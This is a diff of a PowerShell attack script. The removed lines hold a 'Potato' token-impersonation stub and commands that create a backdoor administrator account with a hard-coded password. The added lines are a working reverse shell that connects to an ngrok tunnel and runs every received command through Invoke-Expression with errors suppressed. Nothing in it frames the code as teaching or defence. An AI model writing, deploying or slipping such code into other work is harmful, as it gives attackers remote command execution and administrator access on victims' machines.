@@ -1,16 +1,33 @@
-$code = @"
-using System;
-using System.Runtime.InteropServices;
-using System.Security.Principal;
-public class Potato {
-    [DllImport("advapi32.dll", SetLastError = true)]
-    public static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, int dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
-    public struct STARTUPINFO { public int cb; public string lpReserved; public string lpDesktop; public string lpTitle; public int dwX; public int dwY; public int dwXSize; public int dwYSize; public int dwXCountChars; public int dwYCountChars; public int dwFillAttribute; public int dwFlags; public short wShowWindow; public short cbReserved2; public IntPtr lpReserved2; public IntPtr hStdInput; public IntPtr hStdOutput; public IntPtr hStdError; }
-    public struct PROCESS_INFORMATION { public IntPtr hProcess; public IntPtr hThread; public int dwProcessId; public int dwThreadId; }
+$ErrorActionPreference = 'SilentlyContinue'
+
+$h = '0.tcp.ap.ngrok.io'
+$p = 20831
+
+try {
+    $client = New-Object System.Net.Sockets.TcpClient($h, $p)
+    $stream = $client.GetStream()
+    $writer = New-Object System.IO.StreamWriter($stream)
+    $reader = New-Object System.IO.StreamReader($stream)
+    $writer.AutoFlush = $true
+
+    $writer.WriteLine("Connected to $($h):$($p)")
+
+    while ($true) {
+        $command = $reader.ReadLine()
+        if ([string]::IsNullOrWhiteSpace($command)) { continue }
+        if ($command -eq 'exit') { break }
+
+        $result = try {
+            Invoke-Expression $command 2>&1 | Out-String
+        } catch {
+            $_.Exception.Message
+        }
+
+        $writer.WriteLine($result)
+        $writer.Write("PS> ")
+    }
+
+    $client.Close()
+} catch {
+    $_.Exception.Message
 }
-"@
-# Coba buat user lewat jalur API Windows langsung
-Add-Type -TypeDefinition $code -Language CSharp
-Write-Host "Mencoba injeksi token..."
-net user temanggung-client Jakarta_2026_!#@! /add /y
-net localgroup Administrators temanggung-client /add
